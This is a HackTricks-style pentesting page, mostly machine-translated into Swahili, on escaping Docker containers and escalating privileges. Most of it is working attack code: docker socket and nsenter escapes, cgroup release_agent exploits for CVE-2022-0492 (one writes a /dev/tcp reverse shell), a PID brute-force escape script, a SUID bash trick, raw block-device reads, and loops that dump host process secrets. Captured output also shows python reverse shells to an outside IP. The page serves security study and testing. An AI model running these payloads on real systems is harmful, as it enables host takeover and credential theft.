# Docker Breakout / Privilege Escalation

{{#include ../../../../banners/hacktricks-training.md}}

## Automatic Enumeration & Escape

- [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Inaweza pia **kuorodhesha kontena**
- [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Chombo hiki ni **cha manufaa kuorodhesha kontena ulipo hata kujaribu kutoroka kiotomatiki**
- [**amicontained**](https://github.com/genuinetools/amicontained): Chombo cha manufaa kupata mamlaka ambayo kontena lina ili kutafuta njia za kutoroka kutoka kwake
- [**deepce**](https://github.com/stealthcopter/deepce): Chombo cha kuorodhesha na kutoroka kutoka kwa kontena
- [**grype**](https://github.com/anchore/grype): Pata CVEs zilizomo katika programu iliyosakinishwa kwenye picha

## Mounted Docker Socket Escape

Ikiwa kwa namna fulani unapata kuwa **docker socket imewekwa** ndani ya kontena la docker, utaweza kutoroka kutoka kwake.\
Hii kawaida hutokea katika kontena za docker ambazo kwa sababu fulani zinahitaji kuungana na docker daemon ili kutekeleza vitendo.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
Katika kesi hii unaweza kutumia amri za kawaida za docker kuwasiliana na docker daemon:
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
> [!NOTE]
> Ikiwa **docker socket iko mahali pasipo tarajiwa** bado unaweza kuwasiliana nayo kwa kutumia amri ya **`docker`** na parameter **`-H unix:///path/to/docker.sock`**

Docker daemon inaweza pia [kusikiliza kwenye bandari (kwa kawaida 2375, 2376)](../../../../network-services-pentesting/2375-pentesting-docker.md) au kwenye mifumo ya Systemd, mawasiliano na Docker daemon yanaweza kufanyika kupitia socket ya Systemd `fd://`.

> [!NOTE]
> Zaidi ya hayo, zingatia sockets za wakati wa utekelezaji za runtimes nyingine za kiwango cha juu:
>
> - dockershim: `unix:///var/run/dockershim.sock`
> - containerd: `unix:///run/containerd/containerd.sock`
> - cri-o: `unix:///var/run/crio/crio.sock`
> - frakti: `unix:///var/run/frakti.sock`
> - rktlet: `unix:///var/run/rktlet.sock`
> - ...

## Ukatili wa Uwezo wa Kutoroka

Unapaswa kuangalia uwezo wa kontena, ikiwa ina mojawapo ya zifuatazo, huenda ukawa na uwezo wa kutoroka kutoka kwake: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**

Unaweza kuangalia uwezo wa kontena kwa sasa kwa kutumia **zana za kiotomatiki zilizotajwa hapo awali** au:
```bash
capsh --print
```
Katika ukurasa ufuatao unaweza **kujifunza zaidi kuhusu uwezo wa linux** na jinsi ya kuyatumia vibaya ili kutoroka/kupandisha mamlaka:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Kutoroka kutoka kwa Mifuko ya Kipekee

Mifuko ya kipekee inaweza kuundwa kwa kutumia bendera `--privileged` au kuzima ulinzi maalum:

- `--cap-add=ALL`
- `--security-opt apparmor=unconfined`
- `--security-opt seccomp=unconfined`
- `--security-opt label:disable`
- `--pid=host`
- `--userns=host`
- `--uts=host`
- `--cgroupns=host`
- `Mount /dev`

Bendera `--privileged` inapunguza usalama wa mfuko kwa kiasi kikubwa, ikitoa **ufikiaji wa vifaa usio na kikomo** na kupita **ulinzi kadhaa**. Kwa maelezo ya kina, rejelea nyaraka kuhusu athari kamili za `--privileged`.

{{#ref}}
../docker-privileged.md
{{#endref}}

### Kipekee + hostPID

Kwa ruhusa hizi unaweza tu **kuhamia kwenye eneo la jina la mchakato unaotembea kwenye mwenyeji kama root** kama init (pid:1) kwa kukimbia: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`

Jaribu katika mfuko ukitekeleza:
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Privileged

Kwa kutumia tu bendera ya privileged unaweza kujaribu **kufikia diski ya mwenyeji** au kujaribu **kutoroka kwa kutumia release_agent au njia nyingine za kutoroka**.

Jaribu bypasses zifuatazo katika kontena ukitekeleza:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Mounting Disk - Poc1

Mikono ya docker iliyowekwa vizuri haitaruhusu amri kama **fdisk -l**. Hata hivyo, kwenye amri za docker zisizo na usanidi mzuri ambapo bendera `--privileged` au `--device=/dev/sda1` yenye herufi kubwa imewekwa, inawezekana kupata mamlaka ya kuona diski ya mwenyeji.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

Hivyo, kuchukua udhibiti wa mashine ya mwenyeji, ni rahisi:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
Na voilà! Sasa unaweza kufikia mfumo wa faili wa mwenyeji kwa sababu umewekwa katika folda ya `/mnt/hola`.

#### Kuunganisha Diski - Poc2

Ndani ya kontena, mshambuliaji anaweza kujaribu kupata ufikiaji zaidi wa mfumo wa uendeshaji wa mwenyeji kupitia kiasi cha hostPath kinachoweza kuandikwa kilichoundwa na klasta. Hapa chini kuna mambo ya kawaida unayoweza kuangalia ndani ya kontena ili kuona kama unaweza kutumia njia hii ya mshambuliaji:
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### Privileged Escape Kutumia release_agent iliyopo ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
```bash:Initial PoC
# spawn a new container to exploit via:
# docker run --rm -it --privileged ubuntu bash

# Finds + enables a cgroup release_agent
# Looks for something like: /sys/fs/cgroup/*/release_agent
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
# If "d" is empty, this won't work, you need to use the next PoC

# Enables notify_on_release in the cgroup
mkdir -p $d/w;
echo 1 >$d/w/notify_on_release
# If you have a "Read-only file system" error, you need to use the next PoC

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
t=`sed -n 's/overlay \/ .*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
touch /o; echo $t/c > $d/release_agent

# Creates a payload
echo "#!/bin/sh" > /c
echo "ps > $t/o" >> /c
chmod +x /c

# Triggers the cgroup via empty cgroup.procs
sh -c "echo 0 > $d/w/cgroup.procs"; sleep 1

# Reads the output
cat /o
```
#### Privileged Escape Abusing created release_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC2
```bash:Second PoC
# On the host
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# Mounts the RDMA cgroup controller and create a child cgroup
# This technique should work with the majority of cgroup controllers
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the RDMA cgroup controller, try change rdma to memory to fix it
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
# If mount gives an error, this won't work, you need to use the first PoC

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#For a normal PoC =================
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#===================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/172.17.0.1/9000 0>&1" >> /cmd
chmod a+x /cmd
#===================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
Pata **maelezo ya mbinu** katika:

{{#ref}}
docker-release_agent-cgroups-escape.md
{{#endref}}

#### Kukwepa Privileged kwa kutumia release_agent bila kujua njia inayohusiana - PoC3

Katika mashambulizi yaliyopita, **njia kamili ya kontena ndani ya mfumo wa faili wa mwenyeji inafichuliwa**. Hata hivyo, hii si kila wakati. Katika hali ambapo **hujui njia kamili ya kontena ndani ya mwenyeji** unaweza kutumia mbinu hii:

{{#ref}}
release_agent-exploit-relative-paths-to-pids.md
{{#endref}}
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID} :-("
exit 1
fi
fi
# Set the release_agent path to the guessed pid
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
# Trigger execution of the release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}
```
Kutekeleza PoC ndani ya kontena lenye mamlaka kunapaswa kutoa matokeo yanayofanana na:
```bash
root@container:~$ ./release_agent_pid_brute.sh
Checking pid 100
Checking pid 200
Checking pid 300
Checking pid 400
Checking pid 500
Checking pid 600
Checking pid 700
Checking pid 800
Checking pid 900
Checking pid 1000
Checking pid 1100
Checking pid 1200

Done! Output:
UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 11:25 ?        00:00:01 /sbin/init
root         2     0  0 11:25 ?        00:00:00 [kthreadd]
root         3     2  0 11:25 ?        00:00:00 [rcu_gp]
root         4     2  0 11:25 ?        00:00:00 [rcu_par_gp]
root         5     2  0 11:25 ?        00:00:00 [kworker/0:0-events]
root         6     2  0 11:25 ?        00:00:00 [kworker/0:0H-kblockd]
root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
...
```
#### Privileged Escape Abusing Sensitive Mounts

Kuna faili kadhaa ambazo zinaweza kuunganishwa ambazo zinatoa **habari kuhusu mwenyeji wa chini**. Baadhi yao wanaweza hata kuashiria **kitu kinachoweza kutekelezwa na mwenyeji wakati kitu kinatokea** (ambacho kitamruhusu mshambuliaji kutoroka kutoka kwenye kontena).\
Kukandamiza faili hizi kunaweza kuruhusu:

- release_agent (iliyoshughulikiwa tayari)
- [binfmt_misc](sensitive-mounts.md#proc-sys-fs-binfmt_misc)
- [core_pattern](sensitive-mounts.md#proc-sys-kernel-core_pattern)
- [uevent_helper](sensitive-mounts.md#sys-kernel-uevent_helper)
- [modprobe](sensitive-mounts.md#proc-sys-kernel-modprobe)

Hata hivyo, unaweza kupata **faili nyingine nyeti** za kuangalia kwenye ukurasa huu:

{{#ref}}
sensitive-mounts.md
{{#endref}}

### Arbitrary Mounts

Katika matukio kadhaa utaona kwamba **kontena lina kiasi fulani kilichounganishwa kutoka kwa mwenyeji**. Ikiwa kiasi hiki hakikupangwa vizuri unaweza kuwa na uwezo wa **kufikia/kubadilisha data nyeti**: Soma siri, badilisha ssh authorized_keys…
```bash
docker run --rm -it -v /:/host ubuntu bash
```
### Privilege Escalation with 2 shells and host mount

Ikiwa una ufikiaji kama **root ndani ya kontena** ambalo lina folda fulani kutoka kwa mwenyeji iliyowekwa na una **kutoroka kama mtumiaji asiye na mamlaka kwenda kwa mwenyeji** na una ufikiaji wa kusoma juu ya folda iliyowekwa.\
Unaweza kuunda **faili ya bash suid** katika **folda iliyowekwa** ndani ya **kontena** na **kuitekeleza kutoka kwa mwenyeji** ili kupandisha mamlaka.
```bash
cp /bin/bash . #From non priv inside mounted folder
# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
chown root:root bash #From container as root inside mounted folder
chmod 4777 bash #From container as root inside mounted folder
bash -p #From non priv inside mounted folder
```
### Privilege Escalation with 2 shells

Ikiwa una ufikiaji kama **root ndani ya kontena** na ume **kimbia kama mtumiaji asiye na mamlaka hadi kwenye mwenyeji**, unaweza kutumia shell zote mbili ili **privesc ndani ya mwenyeji** ikiwa una uwezo wa MKNOD ndani ya kontena (ni kwa default) kama [**ilivyoelezwa katika chapisho hili**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
Kwa uwezo kama huo, mtumiaji wa root ndani ya kontena anaruhusiwa **kuunda faili za kifaa cha block**. Faili za kifaa ni faili maalum ambazo zinatumika ili **kufikia vifaa vya chini na moduli za kernel**. Kwa mfano, faili ya kifaa cha block /dev/sda inatoa ufikiaji wa **kusoma data safi kwenye diski ya mfumo**.

Docker inalinda dhidi ya matumizi mabaya ya kifaa cha block ndani ya kontena kwa kutekeleza sera ya cgroup ambayo **inasitisha operesheni za kusoma/kandika kifaa cha block**. Hata hivyo, ikiwa kifaa cha block **kimeundwa ndani ya kontena**, kinapatikana kutoka nje ya kontena kupitia **/proc/PID/root/** directory. Ufikiaji huu unahitaji **mmiliki wa mchakato kuwa sawa** ndani na nje ya kontena.

**Mfano wa Ukatili** kutoka kwenye [**andika hii**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
```bash
# On the container as root
cd /
# Crate device
mknod sda b 8 0
# Give access to it
chmod 777 sda

# Create the nonepriv user of the host inside the container
## In this case it's called augustus (like the user from the host)
echo "augustus:x:1000:1000:augustus,,,:/home/augustus:/bin/bash" >> /etc/passwd
# Get a shell as augustus inside the container
su augustus
su: Authentication failure
(Ignored)
augustus@3a453ab39d3d:/backend$ /bin/sh
/bin/sh
$
```

```bash
# On the host

# get the real PID of the shell inside the container as the new https://app.gitbook.com/s/-L_2uGJGU7AVNRcqRvEi/~/changes/3847/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#privilege-escalation-with-2-shells user
augustus@GoodGames:~$ ps -auxf | grep /bin/sh
root      1496  0.0  0.0   4292   744 ?        S    09:30   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
root      1627  0.0  0.0   4292   756 ?        S    09:44   0:00      \_ /bin/sh -c python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
augustus  1659  0.0  0.0   4292   712 ?        S+   09:48   0:00                          \_ /bin/sh
augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_ grep /bin/sh

# The process ID is 1659 in this case
# Grep for the sda for HTB{ through the process:
augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
```
### hostPID

Ikiwa unaweza kufikia michakato ya mwenyeji, utaweza kufikia habari nyingi nyeti zilizohifadhiwa katika michakato hiyo. Endesha maabara ya mtihani:
```
docker run --rm -it --pid=host ubuntu bash
```
Kwa mfano, utaweza kuorodhesha michakato ukitumia kitu kama `ps auxn` na kutafuta maelezo nyeti katika amri.

Kisha, kwa sababu unaweza **kufikia kila mchakato wa mwenyeji katika /proc/ unaweza tu kuiba siri zao za env** ukikimbia:
```bash
for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
/proc/988058/environ
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
HOSTNAME=argocd-server-69678b4f65-6mmql
USER=abrgocd
...
```
Unaweza pia **kufikia viashiria vya faili vya michakato mingine na kusoma faili zao zilizofunguliwa**:
```bash
for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
less fds.txt
...omitted for brevity...
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/2 -> /dev/pts/0
lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
# You can open the secret filw with:
cat /proc/635813/fd/4
```
Unaweza pia **kuua michakato na kusababisha DoS**.

> [!WARNING]
> Ikiwa kwa namna fulani una **ufikiaji wa haki juu ya mchakato nje ya kontena**, unaweza kuendesha kitu kama `nsenter --target <pid> --all` au `nsenter --target <pid> --mount --net --pid --cgroup` ili **kuendesha shell yenye vizuizi sawa vya ns** (tumaini hakuna) **kama mchakato huo.**

### hostNetwork
```
docker run --rm -it --network=host ubuntu bash
```
Ikiwa kontena ilikamilishwa na Docker [host networking driver (`--network=host`)](https://docs.docker.com/network/host/), stack ya mtandao ya kontena hiyo haijatengwa kutoka kwa mwenyeji wa Docker (kontena inashiriki namespace ya mtandao wa mwenyeji), na kontena hiyo haipati anwani yake ya IP. Kwa maneno mengine, **kontena inafunga huduma zote moja kwa moja kwenye IP ya mwenyeji**. Zaidi ya hayo, kontena inaweza **kuchukua TRAFIKI YOTE ya mtandao ambayo mwenyeji** anatumia na kupokea kwenye interface iliyoshirikiwa `tcpdump -i eth0`.

Kwa mfano, unaweza kutumia hii **kunusa na hata kudanganya trafiki** kati ya mwenyeji na mfano wa metadata.

Kama katika mifano ifuatayo:

- [Writeup: How to contact Google SRE: Dropping a shell in cloud SQL](https://offensi.com/2020/08/18/how-to-contact-google-sre-dropping-a-shell-in-cloud-sql/)
- [Metadata service MITM allows root privilege escalation (EKS / GKE)](https://blog.champtar.fr/Metadata_MITM_root_EKS_GKE/)

Utakuwa na uwezo pia wa kufikia **huduma za mtandao zilizofungwa kwa localhost** ndani ya mwenyeji au hata kufikia **idhini za metadata za node** (ambazo zinaweza kuwa tofauti na zile ambazo kontena linaweza kufikia).

### hostIPC
```bash
docker run --rm -it --ipc=host ubuntu bash
```
Na `hostIPC=true`, unapata ufikiaji wa rasilimali za mawasiliano kati ya michakato ya mwenyeji (IPC), kama vile **kumbukumbu ya pamoja** katika `/dev/shm`. Hii inaruhusu kusoma/kandika ambapo rasilimali hizo za IPC zinatumika na michakato mingine ya mwenyeji au pod. Tumia `ipcs` kuchunguza mbinu hizi za IPC zaidi.

- **Chunguza /dev/shm** - Angalia faili zozote katika eneo hili la kumbukumbu ya pamoja: `ls -la /dev/shm`
- **Chunguza vifaa vya IPC vilivyopo** – Unaweza kuangalia kama vifaa vyovyote vya IPC vinatumika kwa `/usr/bin/ipcs`. Angalia kwa: `ipcs -a`

### Rejesha uwezo

Ikiwa syscall **`unshare`** haijakatazwa unaweza kurejesha uwezo wote ukifanya:
```bash
unshare -UrmCpf bash
# Check them with
cat /proc/self/status | grep CapEff
```
### Unyanyasaji wa nafasi ya mtumiaji kupitia symlink

Tekniki ya pili iliyoelezwa katika chapisho [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) inaonyesha jinsi unavyoweza kutumia bind mounts na nafasi za mtumiaji, kuathiri faili ndani ya mwenyeji (katika kesi hiyo maalum, kufuta faili).

## CVEs

### Runc exploit (CVE-2019-5736)

Iwapo unaweza kutekeleza `docker exec` kama root (labda kwa kutumia sudo), jaribu kupandisha haki kwa kutoroka kutoka kwenye kontena kwa kutumia CVE-2019-5736 (exploit [hapa](https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go)). Tekni hii kwa msingi it **andika upya** _**/bin/sh**_ binary ya **mwenyeji** **kutoka kwenye kontena**, hivyo mtu yeyote anayetekeleza docker exec anaweza kuanzisha payload.

Badilisha payload ipasavyo na jenga main.go kwa `go build main.go`. Binary inayotokana inapaswa kuwekwa kwenye kontena la docker kwa ajili ya utekelezaji.\
Pale inapoanzishwa, mara tu inapoonyesha `[+] Overwritten /bin/sh successfully` unahitaji kutekeleza yafuatayo kutoka kwenye mashine ya mwenyeji:

`docker exec -it <container-name> /bin/sh`

Hii itasababisha payload ambayo ipo katika faili la main.go.

Kwa maelezo zaidi: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)

> [!NOTE]
> Kuna CVEs nyingine ambazo kontena linaweza kuwa hatarini nazo, unaweza kupata orodha katika [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)

## Docker Kutoa Kutoroka

### Uso wa Kutoroka wa Docker

- **Namespaces:** Mchakato unapaswa kuwa **separate kabisa kutoka kwa michakato mingine** kupitia namespaces, hivyo hatuwezi kutoroka kwa kuingiliana na procs wengine kutokana na namespaces (kwa default haiwezi kuwasiliana kupitia IPCs, unix sockets, huduma za mtandao, D-Bus, `/proc` za procs wengine).
- **Mtumiaji wa Root**: Kwa default mtumiaji anayekimbia mchakato ni mtumiaji wa root (hata hivyo haki zake zimepunguzika).
- **Uwezo**: Docker inacha uwezo ufuatao: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
- **Syscalls**: Hizi ndizo syscalls ambazo **mtumiaji wa root hataweza kuita** (kwa sababu ya kukosa uwezo + Seccomp). Syscalls nyingine zinaweza kutumika kujaribu kutoroka.

{{#tabs}}
{{#tab name="x64 syscalls"}}
```yaml
0x067 -- syslog
0x070 -- setsid
0x09b -- pivot_root
0x0a3 -- acct
0x0a4 -- settimeofday
0x0a7 -- swapon
0x0a8 -- swapoff
0x0aa -- sethostname
0x0ab -- setdomainname
0x0af -- init_module
0x0b0 -- delete_module
0x0d4 -- lookup_dcookie
0x0f6 -- kexec_load
0x12c -- fanotify_init
0x130 -- open_by_handle_at
0x139 -- finit_module
0x140 -- kexec_file_load
0x141 -- bpf
```
{{#endtab}}

{{#tab name="arm64 syscalls"}}
```
0x029 -- pivot_root
0x059 -- acct
0x069 -- init_module
0x06a -- delete_module
0x074 -- syslog
0x09d -- setsid
0x0a1 -- sethostname
0x0a2 -- setdomainname
0x0aa -- settimeofday
0x0e0 -- swapon
0x0e1 -- swapoff
0x106 -- fanotify_init
0x109 -- open_by_handle_at
0x111 -- finit_module
0x118 -- bpf
```
{{#endtab}}

{{#tab name="syscall_bf.c"}}
````c
// From a conversation I had with @arget131
// Fir bfing syscalss in x64

#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>

int main()
{
for(int i = 0; i < 333; ++i)
{
if(i == SYS_rt_sigreturn) continue;
if(i == SYS_select) continue;
if(i == SYS_pause) continue;
if(i == SYS_exit_group) continue;
if(i == SYS_exit) continue;
if(i == SYS_clone) continue;
if(i == SYS_fork) continue;
if(i == SYS_vfork) continue;
if(i == SYS_pselect6) continue;
if(i == SYS_ppoll) continue;
if(i == SYS_seccomp) continue;
if(i == SYS_vhangup) continue;
if(i == SYS_reboot) continue;
if(i == SYS_shutdown) continue;
if(i == SYS_msgrcv) continue;
printf("Probando: 0x%03x . . . ", i); fflush(stdout);
if((syscall(i, NULL, NULL, NULL, NULL, NULL, NULL) < 0) && (errno == EPERM))
printf("Error\n");
else
printf("OK\n");
}
}
```

````

{{#endtab}}
{{#endtabs}}

### Container Breakout through Usermode helper Template

If you are in **userspace** (**no kernel exploit** involved) the way to find new escapes mainly involve the following actions (these templates usually require a container in privileged mode):

- Find the **path of the containers filesystem** inside the host
- You can do this via **mount**, or via **brute-force PIDs** as explained in the second release_agent exploit
- Find some functionality where you can **indicate the path of a script to be executed by a host process (helper)** if something happens
- You should be able to **execute the trigger from inside the host**
- You need to know where the containers files are located inside the host to indicate a script you write inside the host
- Have **enough capabilities and disabled protections** to be able to abuse that functionality
- You might need to **mount things** o perform **special privileged actions** you cannot do in a default docker container

## References

- [https://twitter.com/\_fel1x/status/1151487053370187776?lang=en-GB](https://twitter.com/_fel1x/status/1151487053370187776?lang=en-GB)
- [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)
- [https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/host-networking-driver)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
- [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)

{{#include ../../../../banners/hacktricks-training.md}}
